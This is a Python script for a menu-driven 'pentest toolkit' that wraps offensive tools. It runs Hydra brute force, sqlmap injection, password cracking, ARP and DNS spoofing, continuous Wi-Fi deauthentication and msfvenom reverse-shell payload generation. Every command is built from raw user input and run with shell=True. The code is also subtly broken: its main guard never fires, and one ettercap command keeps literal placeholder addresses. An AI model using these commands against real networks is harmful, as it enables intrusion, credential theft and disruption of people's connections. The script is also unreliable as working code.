import os
import subprocess

# Function to clear the screen
def clear_screen():
    if os.name == 'nt':
        os.system('cls')  # Windows
    else:
        os.system('clear')  # Unix/Linux

# Wrapper for subprocess to run system commands
def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as error:
        print(f"Error: {error}")
    else:
        print("\nExecution completed successfully.")

# Banner
def banner():
    print("""
    ==========================================
               Fsociety PenTest Toolkit 
    ==========================================
    An all-in-one ethical hacking toolkit with 
    multiple tools for network, web, and system 
    penetration testing. Beginner and Advanced 
    modes available for all tools.
    ==========================================
    """)

# Nmap (Network Scanning)
def nmap_scan():
    print("\n[1] Beginner Mode (Quick scan)")
    print("[2] Advanced Mode (Custom options)")
    mode = input("Select mode: ")

    target = input("Enter the target IP or domain: ")

    if mode == '1':
        print(f"Running Nmap quick scan on {target}")
        run_command(f"nmap -T4 -F {target}")
    elif mode == '2':
        options = input("Enter Nmap options: ")
        run_command(f"nmap {options} {target}")
    else:
        print("Invalid mode selected.")

# Hydra (Brute Force)
def hydra_bruteforce():
    print("\n[1] Beginner Mode (FTP brute force)")
    print("[2] Advanced Mode (Custom service)")
    mode = input("Select mode: ")

    target = input("Enter the target IP or domain: ")

    if mode == '1':
        run_command(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ftp")
    elif mode == '2':
        service = input("Enter the service (e.g., ssh, ftp): ")
        username = input("Enter the username: ")
        wordlist = input("Enter the wordlist path: ")
        run_command(f"hydra -l {username} -P {wordlist} {target} {service}")
    else:
        print("Invalid mode selected.")

# SQLMap (SQL Injection)
def sqlmap_scan():
    print("\n[1] Beginner Mode (Auto SQL injection)")
    print("[2] Advanced Mode (Custom options)")
    mode = input("Select mode: ")

    url = input("Enter the target URL: ")

    if mode == '1':
        run_command(f"sqlmap -u {url} --batch --banner")
    elif mode == '2':
        options = input("Enter SQLMap options: ")
        run_command(f"sqlmap -u {url} {options}")
    else:
        print("Invalid mode selected.")

# John the Ripper (Password Cracking)
def john_ripper():
    print("\n[1] Beginner Mode (Crack basic password)")
    print("[2] Advanced Mode (Custom file)")
    mode = input("Select mode: ")

    if mode == '1':
        run_command(f"john /usr/share/john/password.lst")
    elif mode == '2':
        password_file = input("Enter path to password file: ")
        run_command(f"john {password_file}")
    else:
        print("Invalid mode selected.")

# Nikto (Web Vulnerability Scan)
def nikto_scan():
    print("\n[1] Beginner Mode (Basic web scan)")
    print("[2] Advanced Mode (Custom options)")
    mode = input("Select mode: ")

    target = input("Enter target domain: ")

    if mode == '1':
        run_command(f"nikto -h {target}")
    elif mode == '2':
        options = input("Enter Nikto options: ")
        run_command(f"nikto -h {target} {options}")
    else:
        print("Invalid mode selected.")

# DNS Spoofing with Ettercap
def dns_spoof():
    print("\n[1] Beginner Mode (Simple DNS spoof)")
    print("[2] Advanced Mode (Custom options)")
    mode = input("Select mode: ")

    if mode == '1':
        print("Running DNS spoof...")
        run_command(f"ettercap -T -q -i eth0 -M arp /target_IP/ /gateway_IP/")
    elif mode == '2':
        options = input("Enter Ettercap options: ")
        run_command(f"ettercap {options}")
    else:
        print("Invalid mode selected.")

# ARP Spoofing with arpspoof
def arp_spoof():
    print("\n[1] Beginner Mode (ARP spoof on default gateway)")
    print("[2] Advanced Mode (Custom target)")
    mode = input("Select mode: ")

    if mode == '1':
        target = input("Enter the target IP: ")
        run_command(f"arpspoof -i eth0 -t {target} 192.168.1.1")
    elif mode == '2':
        target = input("Enter the target IP: ")
        gateway = input("Enter the gateway IP: ")
        run_command(f"arpspoof -i eth0 -t {target} {gateway}")
    else:
        print("Invalid mode selected.")

# Wi-Fi Deauthentication with Aireplay-ng
def wifi_deauth():
    print("\n[1] Beginner Mode (Deauth all clients)")
    print("[2] Advanced Mode (Target specific clients)")
    mode = input("Select mode: ")

    if mode == '1':
        ap_mac = input("Enter the AP MAC address: ")
        run_command(f"aireplay-ng --deauth 0 -a {ap_mac} wlan0")
    elif mode == '2':
        ap_mac = input("Enter the AP MAC: ")
        client_mac = input("Enter the client MAC: ")
        run_command(f"aireplay-ng --deauth 0 -a {ap_mac} -c {client_mac} wlan0")
    else:
        print("Invalid mode selected.")

# Metasploit (Launching msfconsole)
def metasploit():
    print("\nLaunching Metasploit Framework...")
    run_command("msfconsole")

# Reverse Shell Generation with msfvenom
def reverse_shell():
    print("\n[1] Beginner Mode (Linux payload)")
    print("[2] Advanced Mode (Custom payload)")
    mode = input("Select mode: ")

    if mode == '1':
        run_command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f elf > shell.elf")
    elif mode == '2':
        payload = input("Enter payload (e.g., windows/meterpreter/reverse_tcp): ")
        format_ = input("Enter format (e.g., exe, elf): ")
        run_command(f"msfvenom -p {payload} LHOST=your_ip LPORT=your_port -f {format_} > shell.{format_}")
    else:
        print("Invalid mode selected.")

# Masscan (Fast Port Scanning)
def masscan_scan():
    print("\n[1] Beginner Mode (Basic scan)")
    print("[2] Advanced Mode (Custom options)")
    mode = input("Select mode: ")

    target = input("Enter the target IP range: ")

    if mode == '1':
        run_command(f"masscan -p0-65535 {target}")
    elif mode == '2':
        options = input("Enter Masscan options: ")
        run_command(f"masscan {options} {target}")
    else:
        print("Invalid mode selected.")

# Main menu to select the tool
def main_menu():
    while True:
        clear_screen()
        banner()
        print("""
        1. Network Scan (Nmap)
        2. Brute Force Attack (Hydra)
        3. SQL Injection (SQLMap)
        4. Password Cracking (John the Ripper)
        5. Web Vulnerability Scan (Nikto)
        6. DNS Spoofing (Ettercap)
        7. ARP Spoofing (arpspoof)
        8. Wi-Fi Deauthentication (Aireplay-ng)
        9. Metasploit (msfconsole)
        10. Reverse Shell (msfvenom)
        11. Fast Port Scan (Masscan)
        12. Exit
        """)

        choice = input("Select an option: ")

        if choice == '1':
            nmap_scan()
        elif choice == '2':
            hydra_bruteforce()
        elif choice == '3':
            sqlmap_scan()
        elif choice == '4':
            john_ripper()
        elif choice == '5':
            nikto_scan()
        elif choice == '6':
            dns_spoof()
        elif choice == '7':
            arp_spoof()
        elif choice == '8':
            wifi_deauth()
        elif choice == '9':
            metasploit()
        elif choice == '10':
            reverse_shell()
        elif choice == '11':
            masscan_scan()
        elif choice == '12':
            print("Exiting toolkit. Stay ethical!")
            break
        else:
            print("Invalid option. Please try again.")

# Start the program
if name == "main":
    main_menu()



